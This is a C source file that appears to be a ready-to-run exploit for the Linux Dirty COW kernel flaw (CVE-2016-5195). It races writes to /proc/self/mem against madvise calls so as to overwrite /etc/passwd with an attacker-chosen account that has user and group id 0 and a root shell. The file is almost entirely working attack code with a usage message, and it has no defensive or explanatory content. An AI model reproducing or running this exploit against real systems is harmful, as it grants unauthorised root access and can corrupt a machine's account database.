/**
 * 
 * CVE-2016-5195
 * dirty C-O-W
 * exploit by arttnba3
 * 2021.5.24
 *  
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>
#include <crypt.h>

struct stat passwd_st;
void * map;
char *fake_user;
int fake_user_length;

pthread_t write_thread, madvise_thread;

struct Userinfo
{
    char *username;
    char *hash;
    int user_id;
    int group_id;
    char *info;
    char *home_dir;
    char *shell;
}hacker = 
{
    .user_id = 0,
    .group_id = 0,
    .info = "a3pwn",
    .home_dir = "/root",
    .shell = "/bin/bash",
};

void * madviseThread(void * argv);
void * writeThread(void * argv);

int main(int argc, char ** argv)
{
    int passwd_fd;

    if (argc < 3)
    {
        puts("usage: ./dirty username password");
        puts("do not forget to make a backup for the /etc/passwd by yourself");
        return 0;
    }

    hacker.username = argv[1];
    hacker.hash = crypt(argv[2], argv[1]);

    fake_user_length = snprintf(NULL, 0, "%s:%s:%d:%d:%s:%s:%s\n", 
        hacker.username, 
        hacker.hash, 
        hacker.user_id, 
        hacker.group_id, 
        hacker.info, 
        hacker.home_dir, 
        hacker.shell);
    fake_user = (char * ) malloc(fake_user_length + 0x10);

    sprintf(fake_user, "%s:%s:%d:%d:%s:%s:%s\n", 
        hacker.username, 
        hacker.hash, 
        hacker.user_id, 
        hacker.group_id, 
        hacker.info, 
        hacker.home_dir, 
        hacker.shell);

    
    passwd_fd = open("/etc/passwd", O_RDONLY);
    printf("fd of /etc/passwd: %d\n", passwd_fd);

    fstat(passwd_fd, &passwd_st); // get /etc/passwd file length
    map = mmap(NULL, passwd_st.st_size, PROT_READ, MAP_PRIVATE, passwd_fd, 0);

    pthread_create(&madvise_thread, NULL, madviseThread, NULL);
    pthread_create(&write_thread, NULL, writeThread, NULL);

    pthread_join(madvise_thread, NULL);
    pthread_join(write_thread, NULL);

    return 0;
}

void * writeThread(void * argv)
{
    int mm_fd = open("/proc/self/mem", O_RDWR);
    printf("fd of mem: %d\n", mm_fd);
    for (int i = 0; i < 0x10000; i++)
    {
        lseek(mm_fd, (off_t) map, SEEK_SET);
        write(mm_fd, fake_user, fake_user_length);
    }

    return NULL;
}

void * madviseThread(void * argv)
{
    for (int i = 0; i < 0x10000; i++){
        madvise(map, 0x100, MADV_DONTNEED);
    }

    return NULL;
}

